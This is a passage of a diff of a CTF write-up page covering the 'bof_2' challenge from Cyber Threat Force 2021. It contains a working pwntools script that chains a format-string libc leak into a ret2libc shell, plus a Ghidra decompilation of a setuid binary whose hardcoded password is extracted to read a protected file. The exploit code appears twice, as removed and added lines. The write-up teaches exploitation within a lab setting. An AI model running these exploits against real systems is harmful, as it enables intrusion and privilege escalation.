-</span></span></code></pre></div><p>The flag was in <code>/home/ctf/flag.txt</code>: <code>CYBERTF{l3@ks_I5_Us3Fu11}</code>.</p><h2 id=level-2-privesc>Level 2: PrivEsc<a href=#level-2-privesc class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Looking in <code>/bin</code> again, we find a <code>readline</code> SETUID binary. I used the same snippet to download the file:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
-</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> conn()
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%2$p-&#39;</span>)
-</span></span><span style=display:flex><span>    greeting <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
-</span></span><span style=display:flex><span>    leaked_io_2_1_stdin <span style=color:#f92672>=</span> int(greeting<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-&#39;</span>)[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(), <span style=color:#ae81ff>16</span>)
-</span></span><span style=display:flex><span>    libc_address <span style=color:#f92672>=</span> leaked_io_2_1_stdin <span style=color:#f92672>-</span> libc_config[<span style=color:#e6db74>&#39;io_2_1_stdin&#39;</span>]
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    sys <span style=color:#f92672>=</span> p32(libc_address <span style=color:#f92672>+</span> libc_config[<span style=color:#e6db74>&#39;system&#39;</span>])
-</span></span><span style=display:flex><span>    sh <span style=color:#f92672>=</span> p32(libc_address <span style=color:#f92672>+</span> libc_config[<span style=color:#e6db74>&#39;str_bin_sh&#39;</span>])
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(flat({<span style=color:#ae81ff>49</span>: sys <span style=color:#f92672>+</span> p32(<span style=color:#ae81ff>0xcafebabe</span>) <span style=color:#f92672>+</span> sh}))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;readline&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> f:
-</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;cat /bin/readline&#39;</span>)
-</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;exit&#39;</span>)
-</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(r<span style=color:#f92672>.</span>recvall())
-</span></span></code></pre></div><p>We can look at the binary in Ghidra:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>undefined8 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> param_1,<span style=color:#66d9ef>long</span> param_2) {
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> iVar1;
-</span></span><span style=display:flex><span>  size_t sVar2;
-</span></span><span style=display:flex><span>  undefined8 uVar3;
-</span></span><span style=display:flex><span>  FILE <span style=color:#f92672>*</span>__stream;
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pcVar4;
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> lVar5;
-</span></span><span style=display:flex><span>  undefined8 <span style=color:#f92672>*</span>puVar6;
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
-</span></span><span style=display:flex><span>  byte bVar7;
-</span></span><span style=display:flex><span>  undefined8 local_426;
-</span></span><span style=display:flex><span>  undefined4 local_41e;
-</span></span><span style=display:flex><span>  undefined2 local_41a;
-</span></span><span style=display:flex><span>  undefined8 local_418;
-</span></span><span style=display:flex><span>  undefined8 local_410;
-</span></span><span style=display:flex><span>  undefined8 local_408 [<span style=color:#ae81ff>127</span>];
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> local_10;
-</span></span><span style=display:flex><span>  
-</span></span><span style=display:flex><span>  bVar7 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>  local_10 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
-</span></span><span style=display:flex><span>  setreuid(<span style=color:#ae81ff>0x3e9</span>,<span style=color:#ae81ff>0x3e9</span>);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (param_1 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span>) {
-</span></span><span style=display:flex><span>                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
-</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  local_426 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xaa333231efbeadde</span>;
-</span></span><span style=display:flex><span>  local_41e <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xc0ddccbb</span>;
-</span></span><span style=display:flex><span>  local_41a <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xeeff</span>;
-</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;&#34;</span>);
-</span></span><span style=display:flex><span>  sVar2 <span style=color:#f92672>=</span> strlen(<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)(param_2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>));
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (sVar2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xe</span>) {
-</span></span><span style=display:flex><span>    iVar1 <span style=color:#f92672>=</span> check(<span style=color:#f92672>&amp;</span>local_426,<span style=color:#f92672>*</span>(undefined8 <span style=color:#f92672>*</span>)(param_2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>),<span style=color:#ae81ff>0xe</span>,<span style=color:#f92672>*</span>(undefined8 <span style=color:#f92672>*</span>)(param_2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>));
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
-</span></span><span style=display:flex><span>      puts(<span style=color:#e6db74>&#34;Password check&#34;</span>);
-</span></span><span style=display:flex><span>      local_418 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>      local_410 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>      lVar5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7e</span>;
-</span></span><span style=display:flex><span>      puVar6 <span style=color:#f92672>=</span> local_408;
-</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span> (lVar5 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
-</span></span><span style=display:flex><span>        lVar5 <span style=color:#f92672>=</span> lVar5 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>puVar6 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>        puVar6 <span style=color:#f92672>=</span> puVar6 <span style=color:#f92672>+</span> (ulong)bVar7 <span style=color:#f92672>*</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>      }
-</span></span><span style=display:flex><span>      __stream <span style=color:#f92672>=</span> fopen(<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)(param_2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>),<span style=color:#e6db74>&#34;r&#34;</span>);
-</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span>( true ) {
-</span></span><span style=display:flex><span>        pcVar4 <span style=color:#f92672>=</span> fgets((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_418,<span style=color:#ae81ff>0x400</span>,__stream);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (pcVar4 <span style=color:#f92672>==</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>) <span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>        puts((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_418);
-</span></span><span style=display:flex><span>      }
-</span></span><span style=display:flex><span>      uVar3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>      puts(<span style=color:#e6db74>&#34;Password failed&#34;</span>);
-</span></span><span style=display:flex><span>      uVar3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>    uVar3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (local_10 <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>)) {
-</span></span><span style=display:flex><span>                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
-</span></span><span style=display:flex><span>    __stack_chk_fail();
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> uVar3;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>check</span>(<span style=color:#66d9ef>long</span> param_1,<span style=color:#66d9ef>long</span> param_2,ulong param_3) {
-</span></span><span style=display:flex><span>  ulong local_10;
-</span></span><span style=display:flex><span>  
-</span></span><span style=display:flex><span>  local_10 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>( true ) {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (param_3 <span style=color:#f92672>&lt;=</span> local_10) {
-</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(local_10 <span style=color:#f92672>+</span> param_1) <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(local_10 <span style=color:#f92672>+</span> param_2)) <span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>    local_10 <span style=color:#f92672>=</span> local_10 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>int</span>)<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(local_10 <span style=color:#f92672>+</span> param_1) <span style=color:#f92672>-</span> (<span style=color:#66d9ef>int</span>)<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(local_10 <span style=color:#f92672>+</span> param_2);
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>The program basically takes two arguments: a password, and a file path. If the password is correct, then the file content will be printed out.</p><p>The <code>check</code> function is basically a <code>strcmp</code> clone, so the password is contained in <code>local_426</code>. Ghidra errors out a bit here, <code>local_426</code>, <code>local_41e</code> and <code>local_41a</code> are all the same variable.</p><p>Knowing this, we can now get the flag (which is in the home of the binary owner):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ /bin/readline <span style=color:#66d9ef>$(</span>perl -e <span style=color:#e6db74>&#39;print &#34;\xde\xad\xbe\xef\x31\x32\x33\xaa\xbb\xcc\xdd\xc0\xff\xee /home/ctf_cracked/flag.txt&#34;&#39;</span><span style=color:#66d9ef>)</span>
-</span></span></code></pre></div><p>The flag is <code>CYBERTF{None_asciiPrint@ble:p}</code>.</p><h2 id=more>More<a href=#more class=hanchor arialabel=Anchor>&#8983;</a></h2><p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof2>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/><span class=button__icon>←</span>
+</code></pre><p>We get four possible versions. I tested them all until one worked (using the exploit below). The correct version (or at least a compatible one) was <code>libc6-i386_2.28-10_amd64</code>.</p><p>Now that we know all of this, the exploit needs to 1. leak an address so that we can defeat ASLR and 2. build a simple ropchain to pop a shell.</p><p>Here is the exploit script:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>)
+
+context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
+context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;konsole&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>]
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
+    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
+        r <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
+    <span style=color:#66d9ef>else</span>:
+        r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;XXX.XXX.XXX.XXX&#34;</span>, <span style=color:#ae81ff>00000</span>)
+
+    <span style=color:#66d9ef>return</span> r
+
+<span style=color:#75715e># libc6-i386_2.28-10_amd64</span>
+libc_config <span style=color:#f92672>=</span> {
+    <span style=color:#e6db74>&#39;io_2_1_stdin&#39;</span>: <span style=color:#ae81ff>0x001da5c0</span>,
+    <span style=color:#e6db74>&#39;system&#39;</span>: <span style=color:#ae81ff>0x0003e9e0</span>,
+    <span style=color:#e6db74>&#39;str_bin_sh&#39;</span>: <span style=color:#ae81ff>0x17eaaa</span>,
+}
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+    r <span style=color:#f92672>=</span> conn()
+
+    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%2$p-&#39;</span>)
+    greeting <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    leaked_io_2_1_stdin <span style=color:#f92672>=</span> int(greeting<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-&#39;</span>)[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(), <span style=color:#ae81ff>16</span>)
+    libc_address <span style=color:#f92672>=</span> leaked_io_2_1_stdin <span style=color:#f92672>-</span> libc_config[<span style=color:#e6db74>&#39;io_2_1_stdin&#39;</span>]
+
+    sys <span style=color:#f92672>=</span> p32(libc_address <span style=color:#f92672>+</span> libc_config[<span style=color:#e6db74>&#39;system&#39;</span>])
+    sh <span style=color:#f92672>=</span> p32(libc_address <span style=color:#f92672>+</span> libc_config[<span style=color:#e6db74>&#39;str_bin_sh&#39;</span>])
+    r<span style=color:#f92672>.</span>sendline(flat({<span style=color:#ae81ff>49</span>: sys <span style=color:#f92672>+</span> p32(<span style=color:#ae81ff>0xcafebabe</span>) <span style=color:#f92672>+</span> sh}))
+
+    r<span style=color:#f92672>.</span>interactive()
+
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+    main()
+</code></pre></div><p>The flag was in <code>/home/ctf/flag.txt</code>: <code>CYBERTF{l3@ks_I5_Us3Fu11}</code>.</p><h2 id=level-2-privesc>Level 2: PrivEsc<a href=#level-2-privesc class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Looking in <code>/bin</code> again, we find a <code>readline</code> SETUID binary. I used the same snippet to download the file:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+    r <span style=color:#f92672>=</span> conn()
+
+    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%2$p-&#39;</span>)
+    greeting <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    leaked_io_2_1_stdin <span style=color:#f92672>=</span> int(greeting<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-&#39;</span>)[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(), <span style=color:#ae81ff>16</span>)
+    libc_address <span style=color:#f92672>=</span> leaked_io_2_1_stdin <span style=color:#f92672>-</span> libc_config[<span style=color:#e6db74>&#39;io_2_1_stdin&#39;</span>]
+
+    sys <span style=color:#f92672>=</span> p32(libc_address <span style=color:#f92672>+</span> libc_config[<span style=color:#e6db74>&#39;system&#39;</span>])
+    sh <span style=color:#f92672>=</span> p32(libc_address <span style=color:#f92672>+</span> libc_config[<span style=color:#e6db74>&#39;str_bin_sh&#39;</span>])
+    r<span style=color:#f92672>.</span>sendline(flat({<span style=color:#ae81ff>49</span>: sys <span style=color:#f92672>+</span> p32(<span style=color:#ae81ff>0xcafebabe</span>) <span style=color:#f92672>+</span> sh}))
+
+    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;readline&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> f:
+        r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;cat /bin/readline&#39;</span>)
+        r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;exit&#39;</span>)
+        f<span style=color:#f92672>.</span>write(r<span style=color:#f92672>.</span>recvall())
+</code></pre></div><p>We can look at the binary in Ghidra:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined8 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> param_1,<span style=color:#66d9ef>long</span> param_2) {
+  <span style=color:#66d9ef>int</span> iVar1;
+  size_t sVar2;
+  undefined8 uVar3;
+  FILE <span style=color:#f92672>*</span>__stream;
+  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pcVar4;
+  <span style=color:#66d9ef>long</span> lVar5;
+  undefined8 <span style=color:#f92672>*</span>puVar6;
+  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
+  byte bVar7;
+  undefined8 local_426;
+  undefined4 local_41e;
+  undefined2 local_41a;
+  undefined8 local_418;
+  undefined8 local_410;
+  undefined8 local_408 [<span style=color:#ae81ff>127</span>];
+  <span style=color:#66d9ef>long</span> local_10;
+  
+  bVar7 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+  local_10 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
+  setreuid(<span style=color:#ae81ff>0x3e9</span>,<span style=color:#ae81ff>0x3e9</span>);
+  <span style=color:#66d9ef>if</span> (param_1 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span>) {
+                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
+    exit(<span style=color:#ae81ff>1</span>);
+  }
+  local_426 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xaa333231efbeadde</span>;
+  local_41e <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xc0ddccbb</span>;
+  local_41a <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xeeff</span>;
+  puts(<span style=color:#e6db74>&#34;&#34;</span>);
+  sVar2 <span style=color:#f92672>=</span> strlen(<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)(param_2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>));
+  <span style=color:#66d9ef>if</span> (sVar2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xe</span>) {
+    iVar1 <span style=color:#f92672>=</span> check(<span style=color:#f92672>&amp;</span>local_426,<span style=color:#f92672>*</span>(undefined8 <span style=color:#f92672>*</span>)(param_2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>),<span style=color:#ae81ff>0xe</span>,<span style=color:#f92672>*</span>(undefined8 <span style=color:#f92672>*</span>)(param_2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>));
+    <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
+      puts(<span style=color:#e6db74>&#34;Password check&#34;</span>);
+      local_418 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+      local_410 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+      lVar5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7e</span>;
+      puVar6 <span style=color:#f92672>=</span> local_408;
+      <span style=color:#66d9ef>while</span> (lVar5 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
+        lVar5 <span style=color:#f92672>=</span> lVar5 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+        <span style=color:#f92672>*</span>puVar6 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+        puVar6 <span style=color:#f92672>=</span> puVar6 <span style=color:#f92672>+</span> (ulong)bVar7 <span style=color:#f92672>*</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
+      }
+      __stream <span style=color:#f92672>=</span> fopen(<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)(param_2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>),<span style=color:#e6db74>&#34;r&#34;</span>);
+      <span style=color:#66d9ef>while</span>( true ) {
+        pcVar4 <span style=color:#f92672>=</span> fgets((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_418,<span style=color:#ae81ff>0x400</span>,__stream);
+        <span style=color:#66d9ef>if</span> (pcVar4 <span style=color:#f92672>==</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>) <span style=color:#66d9ef>break</span>;
+        puts((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_418);
+      }
+      uVar3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+    }
+    <span style=color:#66d9ef>else</span> {
+      puts(<span style=color:#e6db74>&#34;Password failed&#34;</span>);
+      uVar3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+    }
+  }
+  <span style=color:#66d9ef>else</span> {
+    uVar3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+  }
+  <span style=color:#66d9ef>if</span> (local_10 <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>)) {
+                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
+    __stack_chk_fail();
+  }
+  <span style=color:#66d9ef>return</span> uVar3;
+}
+
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>check</span>(<span style=color:#66d9ef>long</span> param_1,<span style=color:#66d9ef>long</span> param_2,ulong param_3) {
+  ulong local_10;
+  
+  local_10 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+  <span style=color:#66d9ef>while</span>( true ) {
+    <span style=color:#66d9ef>if</span> (param_3 <span style=color:#f92672>&lt;=</span> local_10) {
+      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+    }
+    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(local_10 <span style=color:#f92672>+</span> param_1) <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(local_10 <span style=color:#f92672>+</span> param_2)) <span style=color:#66d9ef>break</span>;
+    local_10 <span style=color:#f92672>=</span> local_10 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
+  }
+  <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>int</span>)<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(local_10 <span style=color:#f92672>+</span> param_1) <span style=color:#f92672>-</span> (<span style=color:#66d9ef>int</span>)<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(local_10 <span style=color:#f92672>+</span> param_2);
+}
+</code></pre></div><p>The program basically takes two arguments: a password, and a file path. If the password is correct, then the file content will be printed out.</p><p>The <code>check</code> function is basically a <code>strcmp</code> clone, so the password is contained in <code>local_426</code>. Ghidra errors out a bit here, <code>local_426</code>, <code>local_41e</code> and <code>local_41a</code> are all the same variable.</p><p>Knowing this, we can now get the flag (which is in the home of the binary owner):</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ /bin/readline <span style=color:#66d9ef>$(</span>perl -e <span style=color:#e6db74>&#39;print &#34;\xde\xad\xbe\xef\x31\x32\x33\xaa\xbb\xcc\xdd\xc0\xff\xee /home/ctf_cracked/flag.txt&#34;&#39;</span><span style=color:#66d9ef>)</span>
+</code></pre></div><p>The flag is <code>CYBERTF{None_asciiPrint@ble:p}</code>.</p><h2 id=more>More<a href=#more class=hanchor arialabel=Anchor>&#8983;</a></h2><p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof2>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/><span class=button__icon>←</span>
 <span class=button__text>Writeup Cyber Threat Force : bof_3</span></a></span>
 <span class="button next"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/><span class=button__text>Writeup Cyber Threat Force : bof_1 (with GetShell & PrivEsc)</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script>
-<script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
+<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2025 Powered by <a href=http://gohugo.io>Hugo</a></span>
